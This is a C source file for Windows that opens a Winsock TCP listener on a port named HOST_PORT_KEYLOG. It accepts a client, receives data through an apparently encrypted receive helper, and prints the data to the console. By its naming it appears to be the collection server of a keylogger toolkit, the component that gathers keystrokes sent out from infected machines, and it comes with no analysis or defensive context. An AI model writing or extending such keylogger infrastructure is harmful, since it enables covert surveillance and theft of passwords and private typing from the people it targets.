#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winsock2.h>

#include "main.h"
#include "cry_socket.h"


int main() {
	
	// initialize winsock
	WSADATA wsData;
	if (WSAStartup(MAKEWORD(2, 2), &wsData) != 0) { fprintf(stderr, "ERROR: failed to initialize winsock\n"); return 1; }
	
	// create socket
	//SOCKET sock = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, WSA_FLAG_OVERLAPPED);
	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == INVALID_SOCKET) { fprintf(stderr, "ERROR: failed to create socket\n"); return 1; }
	
	// bind socket to ip:port
	struct sockaddr_in addr;
	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_addr.S_un.S_addr = INADDR_ANY;
	addr.sin_port = htons(HOST_PORT_KEYLOG);
	
	// bind & listen
	if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) { fprintf(stderr, "ERROR: failed to bind socket\n"); closesocket(sock); return 1; }
	if (listen(sock, SOMAXCONN) == SOCKET_ERROR)                           { fprintf(stderr, "ERROR: failed to listen\n");      closesocket(sock); return 1; }
	
	printf("# Waiting for a connection...\n");
	// wait for a client
	struct sockaddr_in client;
	memset(&client, 0, sizeof(client));
	int clientSize = sizeof(client);
	SOCKET clientSocket = accept(sock, (struct sockaddr*)&client, &clientSize);
	if (clientSocket == INVALID_SOCKET) { fprintf(stderr, "ERROR: failed to accept %d\n", WSAGetLastError()); closesocket(sock); return 1; }
	printf("# %s:%d\n", inet_ntoa(client.sin_addr), htons(client.sin_port));
	closesocket(sock);
	
	char buff[BIGSIZ] = {0};
	while (TRUE) {
		int result = recvE(clientSocket, buff, BIGSIZ, 0);
		if (result == 0)            { fprintf(stderr, "WARNING: Client disconnected\n"); break; }
		if (result == SOCKET_ERROR) { fprintf(stderr, "ERROR: recv failed\n");           break; }
		if (result > 0)             { fwrite(buff, sizeof(char), result, stdout); }
	}
	
	closesocket(clientSocket);
	
	WSACleanup();
	return 0;
}